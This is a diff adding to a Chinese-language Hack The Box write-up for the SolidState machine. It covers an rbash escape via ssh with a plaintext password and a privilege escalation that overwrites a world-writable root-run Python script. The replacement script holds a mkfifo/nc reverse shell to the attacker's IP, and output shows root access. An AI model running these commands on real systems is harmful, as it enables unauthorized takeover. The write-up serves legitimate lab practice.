@@ -358,6 +358,22 @@ cat  env  ls
 
 # rbash 逃逸
 
+## 方法1 
+
+这个我是看0xdf的wp学到的，使用ssh登录时指定bash
+```
+┌──(root💀kali)-[~/htb/SolidState]
+└─# sshpass -p 'P@55W0rd1!2@' ssh mindy@10.10.10.51 -t bash                                                  127 ⨯
+${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ id
+uid=1001(mindy) gid=1001(mindy) groups=1001(mindy)
+${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ whoami
+mindy
+${debian_chroot:+($debian_chroot)}mindy@solidstate:~$ 
+
+```
+
+## 方法2
+
 查看4555这个服务，貌似存在RCE
 
 ```
@@ -391,6 +407,9 @@ Papers: No Results
 [+]Don't forget to start a listener on port 443 before logging in!
 
 ```
+这个exp的利用原理是写bash文件到```/etc/bash_completion.d```这个文件夹
+任何用户登录ssh，上面文件夹里的文件都会当成bash被执行一遍
+
 
 现在我们监听本地端口443，只要ssh登录一下就能触发反弹
 
@@ -413,26 +432,58 @@ ${debian_chroot:+($debian_chroot)}mindy@solidstate:~$
 
 # 提权
 
+在opt文件夹找到一个tmp.py文件（这个文件在linpeas没有枚举出来。。找了半天提权方法）
 
-/usr/share/mime/application/x-vnc.xml
+```
+${debian_chroot:+($debian_chroot)}mindy@solidstate:/opt$ ls
+ls
+james-2.3.2  tmp.py
+${debian_chroot:+($debian_chroot)}mindy@solidstate:/opt$ cat tmp.py
+cat tmp.py
+#!/usr/bin/env python
+import os
+import sys
+try:
+     os.system('rm -r /tmp/* ')
+except:
+     sys.exit()
+${debian_chroot:+($debian_chroot)}mindy@solidstate:/opt$ ls -alh
+ls -alh
+total 16K
+drwxr-xr-x  3 root root 4.0K Aug 22  2017 .
+drwxr-xr-x 22 root root 4.0K May 27 11:05 ..
+drwxr-xr-x 11 root root 4.0K Apr 26  2021 james-2.3.2
+-rwxrwxrwx  1 root root  105 Aug 22  2017 tmp.py
 
+```
 
-/usr/share/gutenprint/5.2/xml/printers.xml
+文件属主是root，看起来像是定期清理tmp下面的所有文件
 
+替换成下面文件
+```
+#!/usr/bin/env python
+import os
+import sys
+try:
+     os.system('rm -r /tmp/* ')
+     os.system('rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.4 443 >/tmp/f ')
+except:
+     sys.exit()
+```
 
-/home/mindy/.gnupg/pubring.kbx
+等待几分钟，拿到root shell
+```
+┌──(root💀kali)-[~]
+└─# nc -lnvp 443                                                                                                 1 ⨯
+listening on [any] 443 ...
+connect to [10.10.16.4] from (UNKNOWN) [10.10.10.51] 55476
+/bin/sh: 0: can't access tty; job control turned off
+# id
+uid=0(root) gid=0(root) groups=0(root)
+# whoami
+root
+# cat /root/root.txt
+7fd6f62f8dd26e...
+# 
 
-
-
-${debian_chroot:+($debian_chroot)}mindy@solidstate:/tmp$ netstat -ano
-netstat -ano
-Active Internet connections (servers and established)
-Proto Recv-Q Send-Q Local Address           Foreign Address         State       Timer
-tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      off (0.00/0/0)
-tcp        0      0 127.0.0.1:631           0.0.0.0:*               LISTEN      off (0.00/0/0)
-tcp        0     13 10.10.10.51:48296       10.10.16.4:443          ESTABLISHED on (1.68/0/0)
-tcp        0      0 10.10.10.51:22          10.10.16.4:54044        ESTABLISHED keepalive (6438.41/0/0)
-
-
-
-ssh -N -R 10.10.16.4:631:127.0.0.1:631 root@10.10.16.4
+```
